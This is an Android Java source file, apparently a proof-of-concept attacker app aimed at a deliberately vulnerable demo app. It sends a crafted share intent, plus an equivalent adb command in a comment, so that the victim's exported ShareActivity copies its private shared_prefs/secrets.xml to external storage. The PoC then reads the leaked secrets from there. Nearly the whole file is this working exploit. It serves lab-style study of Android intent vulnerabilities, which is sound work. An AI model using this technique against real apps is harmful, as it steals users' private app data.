package com.example.vulnapps.sharing_activities_poc;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class MainActivity extends AppCompatActivity {

    static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // adb shell am start
        //     -a android.intent.action.SEND
        //     -t "image/png"
        //     -n com.example.vulnapps.sharing_activities/.ShareActivity
        //     --eu android.intent.extra.STREAM "file:///data/user/0/com.example.vulnapps.sharing_activities/shared_prefs/secrets.xml"

        StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX);

        int check = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
        if (check == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(MainActivity.this,new String[] { Manifest.permission.READ_EXTERNAL_STORAGE },0);
        }

        Button create_secret_data = findViewById(R.id.exploit);
        Button read_secret = findViewById(R.id.read_secret);

        create_secret_data.setOnClickListener(view -> {
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setClassName("com.example.vulnapps.sharing_activities", "com.example.vulnapps.sharing_activities.ShareActivity");
            intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("file:///data/user/0/com.example.vulnapps.sharing_activities/shared_prefs/secrets.xml"));
            startActivity(intent);
            Log.d(TAG, "onCreate: Sent intent.");
        });

        read_secret.setOnClickListener(view -> {
            try {
                String text = "";
                String path = "/storage/emulated/0/Android/data/com.example.vulnapps.sharing_activities/cache/temp";
                if (!(new File(path).exists())) {
                    Toast.makeText(this, "File not Found.", Toast.LENGTH_SHORT).show();
                    return;
                }
                FileInputStream fileInputStream = new FileInputStream(path);
                BufferedReader reader = new BufferedReader(new InputStreamReader(fileInputStream, StandardCharsets.UTF_8));
                String lineBuffer;
                while (true){
                    lineBuffer = reader.readLine();
                    if (lineBuffer != null){
                        text += lineBuffer;
                    }
                    else {
                        break;
                    }
                }
                Log.d(TAG, "onCreate: " + text);
                Toast.makeText(this, text, Toast.LENGTH_SHORT).show();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
    }
}